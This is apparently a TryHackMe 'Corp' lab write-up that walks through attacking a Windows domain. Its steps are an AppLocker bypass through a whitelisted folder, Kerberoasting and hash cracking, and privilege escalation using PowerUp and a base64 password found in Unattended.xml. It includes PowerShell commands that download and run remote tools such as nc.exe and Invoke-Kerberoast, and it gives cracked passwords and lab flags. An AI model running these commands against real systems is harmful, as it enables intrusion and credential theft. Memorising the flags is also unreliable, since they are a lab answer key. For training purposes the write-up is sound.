# Corp Writeup
#pentest/tryhackme

## AppLocker
AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the:
* programs path
* publisher
* hash.

## Bypass AppLocker
There are many ways to bypass AppLocker.

If AppLocker is configured with **default AppLocker rules**, we can bypass it by placing our executable in the following directory: 
`C:\Windows\System32\spool\drivers\color` , which is whitelisted by default. 

**Task:** Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.

First let’s connect to the windows machine through RDP: `xfreerdp /f /u:'corp\dark' /v:10.10.106.60`

`CTRL + ALT + ENTER` allows us to escape fullscreen mode.

```shell
powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.2.13.100:8000/nc.exe', 'C:\Windows\System32\spool\drivers\color\nc.exe')"
```

Other ways to bypass AppLocker:
* [How to Bypass Windows AppLocker | Ethical Hacking Tutorials, Tips and Tricks](https://www.hacking-tutorial.com/hacking-tutorial/how-to-bypass-windows-applocker/)
* [GitHub - api0cradle/UltimateAppLockerByPassList: The goal of this repository is to document the most common techniques to bypass AppLocker.](https://github.com/api0cradle/UltimateAppLockerByPassList)

## Powershell history location

Just like Linux bash, Windows powershell saves all previous commands into a file called **ConsoleHost_history**. This is located at 
`%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Printing the contents of the file:

```shell
powershell Get-Content -Path 'C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'
```

## Kerberos
See [[Kerberos]] for an in-depth explanation of Kerberos.

Lets first enumerate Windows. If we run `setspn -T medin -Q */*` we can extract all accounts in the SPN.
::SPN is the Service Principal Name::, and is the mapping between service and account.

Running that command, we find an existing SPN. What user is that for?

```powershell
PS C:\Windows\System32\spool\drivers\color> setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
```

So the answer is: `CN=fela,CN=Users,DC=corp,DC=Local`

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
Lets first get the Powershell Invoke-Kerberoast script.

```powershell
powershell -c "(new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1', 'C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1')"
```

If the above is not working we can download the file on our Kali machine as request it through powershell. 
Now lets load this into memory: `Invoke-Kerberoast -OutputFormat hashcat |fl` 
We should get a SPN ticket, and indeed we get it : 

```powershell
C:\Windows\System32\spool\drivers\color>powershell
PS C:\Windows\System32\spool\drivers\color> Invoke-WebRequest -Uri 'http://<our-ip>/Invoke-Kerberoast.ps1' -OutFile 'Invoke-Kerberoast.ps1'
PS C:\Windows\System32\spool\drivers\color> . .\Invoke-Kerberoast.ps1
PS C:\Windows\System32\spool\drivers\color> Invoke-Kerberoast -OutputFormat hashcat |fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$91413060734DB19DDC6F68ED3D6E5AB6$C86E1E76EE9D275C68BA1F9
                       8C387DFEFD259E5459996FDC7A1251925397330E994404ED4764B04BCBD351FEDB1FB3178177CFA816340633FF00C81A
                       27E2189E015F9CF4D60C1F3FD9CCE59898BEAFCB09C847128260E1A9C826DF3A08D5C19A3E3AB96D525E01A8EE1A56E2
                       B14EE3957BEA78B0259056482F8E84BC1E2A9322B9C72CA01150345E8984C690BE2993080FFF7BF70A2AAE36BE0CC030
                       3D92B54CF1CD383D0957536F21937A6CCE4D737FD39CB249FF8F907826CDCDB35A5D6A78965BDCF5636779FF79EEA857
                       38C5ED3685ABF574F6192690FC5422C32F42653252A42E161C91A6CAFA0C4CB13BB48C297D80CC291F29171DCBAACCF0
                       F4981D9BE577936C48F0B3D9759167A410BD2FED73DD58688FECDAC486F1DF75560B6A7F835E20AA347B222B9A433605
                       10F9A3F467CC56621275D48C27BF2C30738AC4DB77D5DDAB96FF045993F947F605F9FEB73473E2A656C833A43FB72D94
                       158121B4CFCA35B7EADFFB7B3B032339A1AD652034012A317B3B168D4366DD9B632A64B330833887F51DEC7CC1C7BECA
                       784C4E916494E82B62DACA9658A23E579C94B15F747E2F21EF2ADBCE982C554F17D5F814ECA8D6DC546BA8A0C8EC3292
                       DC03F3024D1F29B677EDC0244BD33FBF387367AB76A44CA923BE2684A71401E18271C7CE40E045E8D04571E6DBFB34D2
                       21755C0E3ECB8FFFEE75EB869C2E986FD33394C423892F8C5C66C3329870D97CE1ACD5638946253B65C950498AFF3297
                       4C016761C0F9AB07220CEFE18B8A5520C54DEF11509C82843BBEA57BEFD126E252DCCFE0974613E2A1470C357A347C2E
                       3709F20EDCB5F6CEDFEA1E915C2A041A07C2E9D4E34D6BF8F45A0FC29E05DD7CD27586294F0A1E90607E1B2C6872803C
                       316172B2FB4D2AFB6CE87192310BFC04067289D148382921A612C8E88DE9D21AEE82C11432216CF86A9E773C6A9E75F3
                       FBB154DAA7AFF2B47E77BAC2283B898BB1362D03B8A6B0E6ABA70B90CFA6ABAB1A3EDFB37A59020EC8BA0B1D1702A003
                       54BD7BE6243CC0AED11FD3DB4134608980421DBDBA90D994C829F47908D2AD349F8FCF739E10260C82F5CA52A550307A
                       8BD10B394E9E925AC3E779F355A57F76505FEB41618EBAD6000165D0C37D4EADF6F359AA9A25796EEAD98008F4E7318A
                       2BF96D40E894A34A01D00C012B1AA6E7728559285E096ADC781E60368D7DFC132F68706C1FC6A639CF37E288000040D7
                       C0D21CE1DEBF47B7BE0E0980F104D32BCB527CC2B98902EF034B507DF70DC84FD0815CBC3F9EEE484A8040AB4ED6BD55
                       8CA18ECF0F5221649D1FD044CE7595B74914CAD1B4A6AEE391C1EF18A3AE5C7AC9934B11C0D2040B9B3630BF0FFE7BC8
                       4332C49533D4F665C81C3AECC95BCF07F0CEA82C2AB
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```

Lets use hashcat to bruteforce this password. 
The type of hash we’re cracking is **Kerberos 5 TGS-REP etype 23**and the hashcat code for this is **13100**.

`hashcat -m 13100 -a 0 extracted_hash /usr/share/wordlists/rockyou.txt —force`
or
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

Crack the hash. What is the users password in plain text?
`rubenF124` and after reading the `flag.txt` in the Desktop:  `flag{bde1642535aa396d2439d86fe54a36e4}`

## Privilege Escalation

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.
We will run `PowerUp.ps1` for the enumeration, so let’s load it:

```powershell
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
```

Let’s invoke the script:

```powershell
C:\Users\fela.CORP>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\fela.CORP> Invoke-WebRequest -Uri 'http://10.9.0.54:8000/PowerUp.ps1' -OutFile 'PowerUp.ps1'
PS C:\Users\fela.CORP> . .\PowerUp.ps1
PS C:\Users\fela.CORP> Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'

[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...

UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml

[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...

PS C:\Users\fela.CORP>
```

The script has identified several ways to get Administrator access. The first being to `bypassUAC` and the second is `UnattendedPath`.
We will be exploiting the `UnattendPath` way.

“Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode.”  It is also where users passwords are stored in **base64**. 

Navigate to `C:\Windows\Panther\Unattend\Unattended.xml`

What is the decoded password?
Let’s dump the content of the `C:\Windows\Panther\Unattend\Unattended.xml` file:

```powershell
PS C:\Users\fela.CORP> more C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```

The base64 decoded password is:

```shell
$ echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

We have our administrator password! Let’s obtain the last flag:
The flag is on the desktop:

Answer: `THM{g00d_j0b_SYS4DM1n_M4s73R}`



